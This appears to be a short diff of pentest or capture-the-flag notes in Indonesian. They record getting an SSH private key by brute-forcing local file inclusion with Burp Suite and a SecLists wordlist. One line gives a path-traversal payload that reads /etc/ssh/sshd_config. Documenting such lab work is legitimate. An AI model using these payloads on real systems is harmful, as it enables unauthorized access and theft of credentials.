@@ -1,0 +1,2 @@
+dapat id_rsa dari proses LFI brutefoce dengan burpsuite dengan wl dari `seclists/FUZZ/LFI/`
+	- `/script.php?page=../../../../../../../../../../../../etc/ssh/sshd_config`
